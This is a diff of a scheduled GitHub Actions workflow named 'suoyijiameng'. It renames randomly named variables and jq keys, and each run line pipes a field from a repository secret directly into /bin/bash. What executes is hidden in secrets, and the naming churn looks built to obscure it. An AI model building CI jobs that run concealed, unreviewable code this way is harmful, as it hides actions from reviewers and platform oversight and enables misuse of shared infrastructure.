@@ -3,27 +3,32 @@ name: suoyijiameng
 on:
   workflow_dispatch:
   schedule:
-    - cron: '23 5/6 * * *'
+    - cron: '4 4/6 * * *'
 
-jobs:  # 29823
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: suoyijiameng
         env:
-          zcxem2: ${{ secrets.zcxem2 }}
+          rs16306: ${{ secrets.rs16306 }}
         run: |
-          echo $zcxem2 | jq -r .lsw93023 | /bin/bash
-          echo $r5539 | jq -r .x6183 | /bin/bash
-          echo $ai4 | jq -r .d0 | /bin/bash
-          echo $c68352 | jq -r .wl514 | /bin/bash
-          echo $frl6 | jq -r .rmd2028 | /bin/bash
-          echo $kney87 | jq -r .sgycx744 | /bin/bash
-          echo $uo411 | jq -r .cw500 | /bin/bash
-          echo $db50293 | jq -r .glbpx1 | /bin/bash
-          echo $ozt5 | jq -r .ho0 | /bin/bash
-          echo $mae99 | jq -r .nxpdo12964 | /bin/bash
-          echo $gcmt3 | jq -r .vcvt48869 | /bin/bash
+          echo $rs16306 | jq -r .c08 | /bin/bash
+          echo $hnt31109 | jq -r .yfgtm5644 | /bin/bash
+          echo $j33 | jq -r .o07875 | /bin/bash
+          echo $ly0748 | jq -r .keys69 | /bin/bash
+          echo $uspqk8491 | jq -r .c66015 | /bin/bash
+          echo $rqrma54060 | jq -r .p7 | /bin/bash
+          echo $zerkf7 | jq -r .uhm1 | /bin/bash
+          echo $uv40436 | jq -r .cjjtw65147 | /bin/bash
+          echo $afbg2672 | jq -r .t04 | /bin/bash
+          echo $bsi922 | jq -r .snbn470 | /bin/bash
+          echo $mxdf7 | jq -r .l74429 | /bin/bash
+          echo $xdsp45 | jq -r .nffdt3318 | /bin/bash
+          echo $johux2 | jq -r .bngr35422 | /bin/bash
+          echo $ppoyd59 | jq -r .s145 | /bin/bash
+          echo $o3 | jq -r .eykly2764 | /bin/bash
+          echo $qpo6 | jq -r .czcqr48 | /bin/bash
+          echo $ig54504 | jq -r .g05968 | /bin/bash
 
